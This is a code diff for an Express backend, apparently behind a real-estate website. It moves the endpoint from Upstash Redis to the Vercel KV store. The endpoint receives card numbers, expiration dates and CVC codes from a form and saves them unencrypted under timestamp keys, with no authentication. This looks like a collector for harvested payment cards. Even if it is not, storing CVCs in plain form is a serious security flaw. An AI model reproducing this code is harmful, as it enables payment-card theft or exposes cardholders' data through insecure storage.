@@ -2,10 +2,11 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const { Redis } = require('@upstash/redis');
 const cors = require('cors');
+const { kv } = require('@vercel/kv'); // Import the @vercel/kv package
 
 const app = express();
 
-// Define allowed origins
+// Define allowed origins (add your Vercel domain)
 const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];
 
 app.use(cors({
@@ -22,14 +23,7 @@ app.use(cors({
 
 app.use(bodyParser.json());
 
-// Initialize Upstash Redis client
-const redis = new Redis({
-  url: process.env.UPSTASH_REDIS_URL,
-  token: process.env.UPSTASH_REDIS_TOKEN
-});
-
-
-// Endpoint to save form data to Upstash KV database
+// Endpoint to save form data to the KV database
 app.post('/api/save-data', async (req, res) => {
   const { cardNumber, expirationDate, cvcCode } = req.body;
 
@@ -39,17 +33,17 @@ app.post('/api/save-data', async (req, res) => {
   }
 
   try {
-    // Generate a unique key based on the current timestamp
+    // Generate a unique key for the data
     const timestamp = Date.now();
     const key = `form-data-${timestamp}`;
 
-    // Save data to Upstash Redis
-    await redis.set(key, JSON.stringify({ cardNumber, expirationDate, cvcCode }));
+    // Save data to KV database
+    await kv.set(key, { cardNumber, expirationDate, cvcCode });
 
     console.log('Data saved successfully:', key);
     res.status(200).json({ message: 'Data saved successfully', key });
-  } catch (err) {
-    console.error('Error saving data:', err);
+  } catch (error) {
+    console.error('Error saving data:', error);
     res.status(500).json({ message: 'Failed to save data' });
   }
 });
